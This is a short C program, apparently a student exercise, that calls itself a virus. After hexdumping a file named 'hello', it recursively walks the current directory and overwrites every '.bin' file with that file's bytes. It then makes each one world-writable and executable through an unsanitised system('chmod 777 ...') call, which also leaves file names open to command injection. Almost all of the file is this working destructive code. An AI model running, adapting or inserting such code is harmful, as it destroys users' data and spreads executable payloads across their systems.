#include<stdio.h>
#include<stdlib.h>
#include<dirent.h>
#include<string.h>

#define INPUT_FILE "hello"
#define MAX 999
#define VICTIM_DIR "."
unsigned char buffer_array[MAX];
int cntr = 0;

void hexfile_dump(FILE *fp)
{
	unsigned long address = 0;
	//FILE *fp = fopen(INPUT_FILE,"r");
	unsigned char array[MAX];
	size_t n;
	if(fp==NULL)
	{
		fprintf(stderr, "Cannot open file %s\n",INPUT_FILE );
		exit(1);
	}

	printf("\nThe hexdump of the given file is\n");
	while((n = fread(array,sizeof(char),16,fp))!=0)
	{
		printf("%08lx\t",address);
		address += 16;
		for(int i=0;i<n;i++)
		{
			printf(" ");
			printf("%02x",array[i]);
		}
		printf("\n");
	}
	//fclose(fp);
}

void virus(char direct[],size_t last_pos)
{
	//FILE *fp1 = fopen(INPUT_FILE,"r");
	FILE *fp2;
	DIR *current;
    struct dirent *file_name;
    int length;
    char command[MAX];
    
    char path[MAX] = {0};

    current = opendir(direct);
    if(current)
    {
    	while ((file_name = readdir(current)) != NULL)
        {
	        length = strlen(file_name->d_name);
	        if(file_name->d_type == DT_DIR && strcmp(file_name->d_name,".")!=0 &&strcmp(file_name->d_name,"..")!=0)
	        {
	        	strcpy(path,direct);
	        	strcat(path,"/");
	        	strcat(path,file_name->d_name);
	        	virus(path,last_pos);
	        }
	        else if(file_name->d_name[length-4]=='.' && file_name->d_name[length-3]=='b' && file_name->d_name[length-2]=='i' && file_name->d_name[length-1]=='n')
	        {
	        	strcpy(path,direct);
	        	strcat(path,"/");
	        	strcat(path,file_name->d_name);
	        	fp2 = fopen(path,"wb");
	        	if(fp2 == NULL)
	        	{
	        		printf("Error while opening file %s\n",path);
	        		exit(1);
	        	}
	        	fwrite(buffer_array,sizeof(char),last_pos,fp2);
	        	fclose(fp2);
	        	sprintf(command,"chmod 777 %s/%s",direct,file_name->d_name);
	        	system(command);
	        }

        }
        closedir(current);

    }

}


int main(int argc, char const *argv[])
{
	/* code */
	
	FILE *fp = fopen(INPUT_FILE,"r");
	//Dumping file
	//------------------------------------------
	hexfile_dump(fp);
	//------------------------------------------
	printf("\n\n");
	fclose(fp);

	FILE *fp1 = fopen(INPUT_FILE,"r");
	fseek(fp1, 0, SEEK_END);
    size_t last_pos = ftell(fp1);
    //printf("main: %d\n", last_pos);
    fseek(fp1, 0, SEEK_SET);
    fread(buffer_array,sizeof(char),last_pos,fp1);

	//Corrupting Binary Files
	// ----------------------------------------
	virus(VICTIM_DIR,last_pos);
	// ----------------------------------------
	printf("\n");
	fclose(fp);

	return 0;
}